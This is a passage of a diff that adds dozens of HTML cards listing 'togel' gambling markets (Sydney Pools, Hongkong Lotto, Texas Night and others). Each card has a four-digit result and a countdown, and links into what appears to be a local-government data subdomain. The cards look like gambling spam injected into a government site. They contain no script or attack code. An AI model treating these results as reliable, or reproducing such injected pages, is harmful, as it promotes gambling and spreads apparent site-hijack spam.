+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        SYDNEY POOLS                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=272" target="_self" class="p-0 m-0 text-decoration-none">
+                            1079                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795588200000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        SYDNEY LOTTO                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=273" target="_self" class="p-0 m-0 text-decoration-none">
+                            6699                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795588200000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        MALAYSIA SIANG                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=274" target="_self" class="p-0 m-0 text-decoration-none">
+                            0440                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795591800000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        CHINA POOLS                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=275" target="_self" class="p-0 m-0 text-decoration-none">
+                            1614                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795593600000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        KINGKONG POOLS                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=276" target="_self" class="p-0 m-0 text-decoration-none">
+                            3939                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795513500000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        SINGAPORE                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=277" target="_self" class="p-0 m-0 text-decoration-none">
+                            4099                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795600800000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        MALAYSIA                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=278" target="_self" class="p-0 m-0 text-decoration-none">
+                            0835                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795519800000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        PCSO                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=279" target="_self" class="p-0 m-0 text-decoration-none">
+                            3595                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795524000000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TAIWAN                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=280" target="_self" class="p-0 m-0 text-decoration-none">
+                            0172                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795527000000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        QATAR                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=281" target="_self" class="p-0 m-0 text-decoration-none">
+                            9227                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795527000000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        HONGKONG POOLS                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=282" target="_self" class="p-0 m-0 text-decoration-none">
+                            3843                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795533600000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        HONGKONG LOTTO                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=283" target="_self" class="p-0 m-0 text-decoration-none">
+                            9105                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795534200000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        CAMBODIA POOLS                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=284" target="_self" class="p-0 m-0 text-decoration-none">
+                            2310                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795581000000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        BULLSEYE POOLS                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=285" target="_self" class="p-0 m-0 text-decoration-none">
+                            6863                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795581600000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        MAGNUM4D POOLS                     </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=286" target="_self" class="p-0 m-0 text-decoration-none">
+                            3661                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795603200000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        MOROCCO Q1                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=287" target="_self" class="p-0 m-0 text-decoration-none">
+                            6256                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795545000000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        MOROCCO Q2                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=288" target="_self" class="p-0 m-0 text-decoration-none">
+                            0241                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795512600000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        MOROCCO Q3                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=289" target="_self" class="p-0 m-0 text-decoration-none">
+                            6828                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795523400000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        MOROCCO Q4                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=290" target="_self" class="p-0 m-0 text-decoration-none">
+                            5087                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795534200000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        KENTUCKY MIDDAY                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=291" target="_self" class="p-0 m-0 text-decoration-none">
+                            2837                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795535400000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        KENTUCKY EVENING                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=292" target="_self" class="p-0 m-0 text-decoration-none">
+                            9808                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795570200000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TEXAS MORNING                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=293" target="_self" class="p-0 m-0 text-decoration-none">
+                            1961                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795527300000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TEXAS DAY                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=294" target="_self" class="p-0 m-0 text-decoration-none">
+                            2762                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795536000000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TEXAS EVENING                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=295" target="_self" class="p-0 m-0 text-decoration-none">
+                            1915                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795556100000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TEXAS NIGHT                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=296" target="_self" class="p-0 m-0 text-decoration-none">
+                            8069                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795571100000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        MICHIGAN MIDDAY                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=297" target="_self" class="p-0 m-0 text-decoration-none">
+                            8899                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795534500000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        MICHIGAN EVENING                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=298" target="_self" class="p-0 m-0 text-decoration-none">
+                            8961                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795557900000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        INDIANAPOLIS MIDDAY                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=299" target="_self" class="p-0 m-0 text-decoration-none">
+                            3899                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795536000000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        INDIANAPOLIS EVENING                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=300" target="_self" class="p-0 m-0 text-decoration-none">
+                            1748                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795570500000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        VIRGINIA DAY                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=301" target="_self" class="p-0 m-0 text-decoration-none">
+                            0459                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795538100000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        VIRGINIA NIGHT                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=302" target="_self" class="p-0 m-0 text-decoration-none">
+                            9574                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795570500000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        WEST VIRGINIA                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=303" target="_self" class="p-0 m-0 text-decoration-none">
+                            4437                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795556100000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TENNESSEE MORNING                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=304" target="_self" class="p-0 m-0 text-decoration-none">
+                            6758                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795525500000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TENNESEE MIDDAY                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=305" target="_self" class="p-0 m-0 text-decoration-none">
+                            9418                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795537800000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TENNESEE EVENING                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=306" target="_self" class="p-0 m-0 text-decoration-none">
+                            1330                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795557600000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        NEW YORK MIDDAY                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=307" target="_self" class="p-0 m-0 text-decoration-none">
+                            2050                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795540200000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        NEWYORK EVENING                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=308" target="_self" class="p-0 m-0 text-decoration-none">
+                            0465                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795568700000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        OREGON 03                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=309" target="_self" class="p-0 m-0 text-decoration-none">
+                            1863                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795545000000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
